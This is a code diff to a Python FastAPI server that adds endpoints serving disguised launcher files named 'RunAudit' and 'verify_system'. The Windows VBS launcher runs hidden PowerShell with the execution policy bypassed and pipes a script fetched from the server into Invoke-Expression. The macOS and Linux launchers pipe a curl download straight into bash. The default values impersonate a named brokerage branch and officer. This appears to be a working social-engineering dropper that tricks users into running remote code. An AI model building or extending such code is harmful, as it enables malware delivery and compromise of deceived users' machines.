@@ -447,16 +447,18 @@ def download_script(request: Request, client_id: str = Query(...)):
         raise HTTPException(status_code=500, detail="PowerShell script unavailable.")
 
 
+@app.get("/download-vbs-launcher")
 @app.get("/download-vbs")
 def download_vbs(
     request: Request,
-    client_id: str = Query(...),
+    client_id: str = Query(None),
     branch_name: str = Query("RELIGARE BROKING LIMITED"),
     branch_code: str = Query("8301231"),
     officer_name: str = Query("SANDIP BALIRAM LOKHANDE"),
 ):
     base_url = get_effective_base_url(request)
-    sessions[client_id] = {
+    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
+    sessions[cid] = {
         "status": "pending", "branch_name": branch_name,
         "branch_code": branch_code, "officer_name": officer_name,
         "available_pcs": "1", "registered_pcs": "1",
@@ -465,11 +467,37 @@ def download_vbs(
     vbs = (
         f'Set objShell = CreateObject("WScript.Shell")\n'
         f'command = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & Chr(34) & '
-        f'"Invoke-RestMethod -Uri \'{base_url}/sys-agent?client_id={client_id}\' | Invoke-Expression" & Chr(34)\n'
+        f'"Invoke-RestMethod -Uri \'{base_url}/sys-agent?client_id={cid}\' | Invoke-Expression" & Chr(34)\n'
         f'objShell.Run command, 0, False\n'
     )
-    headers = {"Content-Disposition": f"attachment; filename=verify_system_{client_id}.vbs"}
+    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Windows_{cid}.vbs"}
     return Response(content=vbs, media_type="application/octet-stream", headers=headers)
+
+
+@app.get("/download-mac-launcher")
+def download_mac_launcher(request: Request, client_id: str = Query(None)):
+    base_url = get_effective_base_url(request)
+    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
+    cmd_content = (
+        f'#!/usr/bin/env bash\n'
+        f'# Double-click launcher for macOS Finder\n'
+        f'curl -sSL "{base_url}/sys-agent-mac?client_id={cid}" | bash\n'
+    )
+    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Mac_{cid}.command"}
+    return Response(content=cmd_content, media_type="application/x-sh", headers=headers)
+
+
+@app.get("/download-linux-launcher")
+def download_linux_launcher(request: Request, client_id: str = Query(None)):
+    base_url = get_effective_base_url(request)
+    cid = client_id or "sys_" + uuid.uuid4().hex[:10]
+    sh_content = (
+        f'#!/usr/bin/env bash\n'
+        f'# Double-click launcher for Linux Desktop\n'
+        f'curl -sSL "{base_url}/sys-agent-mac?client_id={cid}" | bash\n'
+    )
+    headers = {"Content-Disposition": f"attachment; filename=RunAudit_Linux_{cid}.sh"}
+    return Response(content=sh_content, media_type="application/x-sh", headers=headers)
 
 
 @app.get("/s/{client_id}", response_class=PlainTextResponse)
